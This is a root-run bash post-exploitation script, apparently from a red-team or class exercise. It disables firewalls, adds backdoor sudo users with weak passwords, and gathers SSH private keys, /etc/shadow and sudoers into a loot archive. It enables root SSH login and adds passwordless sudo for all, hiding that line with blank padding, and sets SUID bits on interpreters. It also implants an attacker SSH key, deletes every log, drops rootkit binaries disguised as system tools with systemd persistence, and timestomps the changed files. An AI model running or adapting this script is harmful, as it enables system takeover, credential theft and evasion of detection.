#!/bin/bash

# Hacking? That's not very cash-money of you...
#
# This script must be run as root
# Its functions are as follows:
#	- Attempt to open firewall (U/C)
#	- Add sudo backup users
#	- Collect useful and sensitive files for export
#	- Ensure sudo doesnt need password
#	- SUID bins
#	- Drop prism bins
#	- Establish systemd persistence
#	- Timestomp


# Check Release to see if Ubuntu/CentOS
if [[ -f /etc/centos-release ]]
then
	#echo "CentOS" > /root/version.txt

	### DISABLE FIREWALL ###
	
	# OLD
	#service ipchains stop &>/dev/null
	#service iptables stop &>/dev/null
	#chkconfig ipchains off &>/dev/null
	#chkconfig iptables off &>/dev/null

	# NEW
	iptables -X &> /dev/null
    	iptables -F &> /dev/null
    	iptables -t nat -F &> /dev/null
    	iptables -t nat -X &> /dev/null
    	iptables -t mangle -F &> /dev/null
    	iptables -t mangle -X &> /dev/null
	iptables -P INPUT ACCEPT &> /dev/null
    	iptables -P FORWARD ACCEPT &> /dev/null
    	iptables -P OUTPUT ACCEPT &> /dev/null

	# For the Newer versions
	firewall-cmd stop &>/dev/null
	firewall-cmd disable &>/dev/null
	
	### ADD USERS ###
	useradd -G wheel jmorris &>/dev/null
	echo "jmorris:changeme" | chpasswd &>/dev/null
	useradd -G wheel tgoodman &>/dev/null
	echo "tgoodman:changeme" | chpasswd &>/dev/null
	useradd -G wheel bmiller &>/dev/null
	echo "bmiller:changeme" | chpasswd &>/dev/null
	
	## INSTALL STUFF ##
	yum -y install nmap vim &>/dev/null
	
elif [[ -f /etc/debian_version ]]
then
	#echo "Ubuntu" > /root/version.txt
	
	### DISABLE FIREWALL ON UBUNTU ###
	iptables -X &> /dev/null
        iptables -F &> /dev/null
        iptables -t nat -F &> /dev/null
        iptables -t nat -X &> /dev/null
        iptables -t mangle -F &> /dev/null
        iptables -t mangle -X &> /dev/null
        iptables -P INPUT ACCEPT &> /dev/null
        iptables -P FORWARD ACCEPT &> /dev/null
        iptables -P OUTPUT ACCEPT &> /dev/null

	# UFW just in case...
	ufw disable &>/dev/null
	
	### ADD USERS ###
        useradd -G sudo jmorris &>/dev/null
        echo "jmorris:changeme" | chpasswd &>/dev/null
        useradd -G sudo tgoodman &>/dev/null
        echo "tgoodman:changeme" | chpasswd &>/dev/null
        useradd -G sudo bmiller &>/dev/null
        echo "bmiller:changeme" | chpasswd &>/dev/null

	## INSTALL STUFF ##
	apt -y install nmap vim &>/dev/null


fi

echo "[!] FIREWALL & USER finished"

#===============================================================================
				# COLLECT FOR EXPORT #
#===============================================================================

mkdir -p /tmp/l

# GRAB SSH KEYS
find / -name "*id_rsa*" 2> /dev/null > /tmp/t
mkdir -p /tmp/jg
for k in $(cat /tmp/t); do
       cp $k /tmp/jg/$(echo "$k" | cut -d '/' -f3,5 | sed 's/\//-/g')
done
tar -cvf /tmp/l/keys.tar /tmp/jg
mv /tmp/t /tmp/l/
rm -rf /tmp/jg

# COLLECT SENSITIVE CONFIGURATIONS
cp /etc/passwd /tmp/l/p
cp /etc/shadow /tmp/l/s
cp /etc/group /tmp/l/g
cp /etc/ssh/sshd_config /tmp/l/sh
cp /etc/sudoers /tmp/l/su

# COLLECT HISTORY
#mkdir -p /tmp/l/bh
#find /home -iname ".*history" 2>/dev/null > /tmp/b
#for hist in `cat /tmp/b`; do
#	cp $hist /tmp/bh/$(echo "st$k" | cut -d '/' -f3,5 | sed 's/\//-/g')
#done
#mv /tmp/b /tmp/l/

tar -cvf /tmp/l.tar /tmp/l

echo "[!] LOOT finished"
echo "[!] Don't forget to grab loot from /tmp/l.tar"

#===============================================================================
			# CONFIGURATIONS #
#===============================================================================

# Enable Root login over ssh
if [[ -f /etc/ssh/sshd_config ]]
then
	sed 's/#\?\(PermitRootLogin\s*\).*$/\1 yes/' /etc/ssh/sshd_config > /tmp/asdasd
fi

mv /tmp/asdasd /etc/ssh/sshd_config
rm -f /tmp/asdasd

# Enable sudowoodo
if grep -Fxq "ALL ALL=(ALL:ALL) NOPASSWD:ALL" /etc/sudoers
then
	echo "" >> /etc/sudoers
else
	for i in {1..200}
	do
		echo "" >> /etc/sudoers
	done
	echo 'ALL ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
fi

echo "[!] CONFIG finished"

#===============================================================================
				# SUID #
#===============================================================================

# FIND
if [[ -f /bin/find ]]
then
	sh -c 'chmod 7777 /bin/find'
fi

if [[ -f /usr/bin/find ]]
then
	sh -c 'chmod 7777 /usr/bin/find'
fi

# VIM
if [[ -f /bin/vim ]]
then
	sh -c 'chmod 7777 /bin/vim'
fi

if [[ -f /usr/bin/vim ]]
then
	sh -c 'chmod 7777 /usr/bin/vim'
fi

# PYTHON
if [[ -f /bin/python ]]
then
	sh -c 'chmod 7777 /bin/python'
fi

if [[ -f /bin/python3 ]]
then
	sh -c 'chmod 7777 /bin/python3'
fi

if [[ -f /usr/bin/python ]]
then
	sh -c 'chmod 7777 /usr/bin/python'
fi

if [[ -f /usr/bin/python3 ]]
then
	sh -c 'chmod 7777 /usr/bin/python3'
fi

# PERL
if [[ -f /bin/perl ]]
then
	sh -c 'chmod 7777 /bin/perl'
fi

if [[ -f /usr/bin/perl ]]
then
	sh -c 'chmod 7777 /usr/bin/perl'
fi

echo "[!] SUID finished"
#===============================================================================
				# DROPPER #
#===============================================================================

# DROP SSH KEYS
for d in /home/*; do
	if [ -d "$d"  ];
	then
		if [ -d "$d/.ssh" ];
		then
			echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDjx7//qwlI4IE4ZSrIvTT7D7ASiPeLIzl+0fVdBdbHVDSm+mIh7UQ9r5/d1XmUITWkFbk3KbrG7sJmeLjpd1vdsnr67qrs1dU4s4gHCN2rYeWt3dZxkUfLSjPCTx/Y2X1Itaa+Tdt33uEzuzxSnxCDlSKXAhP1+PedzVp/FsJKmbSaWsZeslLTssqBk4eiG0XIICG3dT0xDJyRmg1BXp1f9l7RvoDq3lAcPCOzg6bQc9U1sk+jinKaBwIEZWHazW+ZlQu4vw1ULTk7wQe87X5vVsPVbhBNaI4DZoWbzW3UizexHkn0RTQlydPEDbizVSUbnZ6hrOOSfBOqG4MM3pHBdIWu0gWnuo7d2CGFnlbMfaVQfhaZsKlU8KpIDZgOWD8gZoHI5xjh5bZEuPrsa2AGtwGoNWx4h9CedHfbb2J6O5YmxPrnL7baR7ofRiXnExvlo+xkS5BaQiAxEUZLjKRnGJZALdjDjLTY6Tt+/QH0+HJFaW6ePtdQIa9DAv7uGbU= moleary@classex.tu" >> /home/$d/.ssh/authorized_keys
		else
			mkdir -p $d/.ssh
		fi
	fi
done

echo "[!] SSHKEYS dropped"

# LOGGER MCLOGGERSON MEANY PANTS MCGEE

find /var/log -type f -delete
cp /tmp/pwn/l3ts_g3t_fUnKii /var/log/



# PRISM
chmod 7700 ./fsdisk
cp ./fsdisk /sbin/
/sbin/fsdisk

chmod 7700 ./devutil
cp ./devutil /usr/local/
/usr/local/devutil

chmod 7700 ./udevd
cp ./udevd /sbin/
/sbin/udevd

echo "[!] PRISM dropped"

# SYSTEMD PERSISTENCE
chmod 777 ./developer-utility.service
cp ./developer-utility.service /etc/systemd/system/
systemctl start developer-utility.service
systemctl enable developer-utility.service

chmod 777 ./developer-utility-daemon.service
cp ./developer-utility-daemon.service /etc/systemd/system/
systemctl start developer-utility-daemon.service
systemctl enable developer-utility-daemon.service

chmod 777 ./filesys.service
cp ./filesys.service /etc/systemd/system/
systemctl start filesys.service
systemctl enable filesys.service

echo "[!] SYSTEMD set"

#===============================================================================
				# TIMESTOMP #
#===============================================================================

touch -a --date "2020-3-20 20:51:30" /etc/sudoers
touch -m --date "2020-3-20 20:51:30" /etc/sudoers

touch -a --date "2020-11-20 20:51:30" /etc/passwd
touch -m --date "2020-11-20 20:51:30" /etc/passwd

touch -a --date "2020-11-20 20:51:30" /etc/shadow
touch -m --date "2020-11-20 20:51:30" /etc/shadow

touch -a --date "2020-3-20 20:51:30" /etc/ssh/sshd_config
touch -m --date "2020-3-20 20:51:30" /etc/ssh/sshd_config

touch -a --date "2020-3-20 20:51:30" /etc/sudoers
touch -m --date "2020-3-20 20:51:30" /etc/sudoers

touch -a --date "2020-11-19 20:51:30" /sbin/fsdisk
touch -m --date "2020-11-19 20:51:30" /sbin/fsdisk

touch -a --date "2016-11-21 20:51:30" /usr/local/devutil
touch -m --date "2016-11-21 20:51:30" /usr/local/devutil

touch -a --date "2020-11-30 20:51:30" /sbin/udevd
touch -m --date "2020-11-30 20:51:30" /sbin/udevd

touch -a --date "2020-11-30 20:51:30" /sbin
touch -m --date "2020-11-30 20:51:30" /sbin

touch -a --date "2021-1-30 20:51:30" /etc/ssh
touch -m --date "2021-1-30 20:51:30" /etc/ssh

touch -a --date "2020-5-20 09:54:30" /etc/systemd/system/developer-utility-daemon.service
touch -m --date "2020-5-20 09:54:30" /etc/systemd/system/developer-utility-daemon.service

touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/filesys.service
touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/filesys.service

touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/developer-utility.service
touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/developer-utility.service

touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/
touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/

touch -a --date "2020-3-20 20:51:30" /etc/systemd/
touch -m --date "2020-3-20 20:51:30" /etc/systemd/

touch -a --date "2020-11-30 20:51:30" /etc
touch -m --date "2020-11-30 20:51:30" /etc

for target in `find /home | grep .ssh`; do
	touch -a --date "2020-1-27 13:06:01" $target
	touch -m --date "2020-1-27 13:06:01" $target
done

echo "[!] TIMESTOMPd"

rm -f /tmp/filesys.service
rm -f /tmp/udevd
rm -f /tmp/fsdisk
rm -f /tmp/devutil
rm -f /tmp/developer-utility.service
rm -f /tmp/developer-utility-daemon.service
rm -rf /tmp/pwn

echo "[!] CLEANED"

exit 0
